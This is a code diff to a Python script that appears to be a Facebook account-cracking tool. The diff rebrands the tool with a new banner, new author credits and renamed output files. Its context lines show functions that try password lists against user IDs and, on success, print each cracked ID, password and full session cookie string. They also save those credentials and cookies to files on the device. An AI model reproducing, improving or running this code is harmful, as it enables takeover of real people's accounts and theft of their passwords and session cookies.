@@ -44,13 +44,14 @@ for xd in range(10000):
 def ____banner____():
     if "win" in sys.platform:os.system("cls")
     else:os.system("clear")
-    print(f"""  \x1b[38;5;43m║╦╬══╦╦╦═╗╔═╦╗
-  \x1b[38;5;42m║╩╣║║║╔╣╬╚╣║║║
-  \x1b[38;5;40m╚═╩╩╩╩╝╚══╩╩═╝ {green}V{white}/{green}ULTRA-007
+    print(f"""  \x1b[38;5;40m▙▗▌▞▀▖▌ ▌▞▀▖▛▀▖▜▘ ▌ ▌▞▀▖▞▀▖▞▀▖▙ ▌
+  \x1b[38;5;41m▌▘▌▙▄▌▙▄▌▙▄▌▌ ▌▐  ▙▄▌▙▄▌▚▄ ▙▄▌▌▌▌
+  \x1b[38;5;42m▌ ▌▌ ▌▌ ▌▌ ▌▌ ▌▐  ▌ ▌▌ ▌▖ ▌▌ ▌▌▝▌
+  \x1b[38;5;43m▘ ▘▘ ▘▘ ▘▘ ▘▀▀ ▀▘ ▘ ▘▘ ▘▝▀ ▘ ▘▘ ▘{green}V{white}/{green}14
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- {rad}[{white}⁂{rad}] {green}DEVELOPER  {white}- {white}MAHADI HASAN AFRIDI
- {rad}[{white}⁂{rad}] {green}FACEBOOK   {white}- {white}Emran Sarkar
- {rad}[{white}⁂{rad}] {green}TOOLTYPE   {white}- {white}FREE{rad}{green}┼{faltu}{rad}FILE & RANDOM{pvt}{green}{green}┼
+ {rad}[{white}⁂{rad}] {green}DEVELOPER  {white}- {green}MAHADI HASAN AFRIDI
+ {rad}[{white}⁂{rad}] {green}FACEBOOK   {white}- {green}MAHADI HASAN AFRIDI
+ {rad}[{white}⁂{rad}] {green}TOOLTYPE   {white}- {green}FREE{rad}┼{faltu}{rad}FILE & RANDOM{pvt}{rad}┼
  {rad}[{white}⁂{rad}] {green}GITHUB     {white}- github.com/MAHADI-143
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
@@ -119,9 +120,9 @@ def A(uid,passlist,tl):
                 coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                 xd = re.findall('c_user=(.*);xs', coki)[0]
                 oks.append(uid)
-                print(f"\r\r{rad} [{green}EM OK-💸{rad}] {green}{xd}{white} -{green} {pas}")
+                print(f"\r\r{rad} [{green}MAHADI-💸{rad}] {green}{xd}{white} -{green} {pas}")
                 print(f"\r\r{green}=[🚬]={coki}")
-                open("/sdcard/ES-OK.txt","a").write(xd+"|"+pas+"|"+coki+"\n")
+                open("/sdcard/MAHADI-RN-M1.txt","a").write(xd+"|"+pas+"|"+coki+"\n")
                 break
             else:continue
         except (requests.exceptions.ConnectionError):
@@ -174,9 +175,9 @@ def B(uid,passlist,tl):
                 oks+=1
                 coki = session.cookies.get_dict()
                 cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                print(f"\r\r{rad} [{green}SAMIR-💸{rad}] {green}{uid}{white} -{green} {pas}")
+                print(f"\r\r{rad} [{green}MAHADI-💸{rad}] {green}{uid}{white} -{green} {pas}")
                 print(f"\r\r{green}=[🚬]={cookie}")
-                open('/sdcard/SAMIR-RN-M1.txt','a').write(uid+' | '+pas+'\n');open('/sdcard/SAMIR-RN-M1-COOKIE.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
+                open('/sdcard/MAHADI-RN-M2.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
                 break
             else:
                 continue
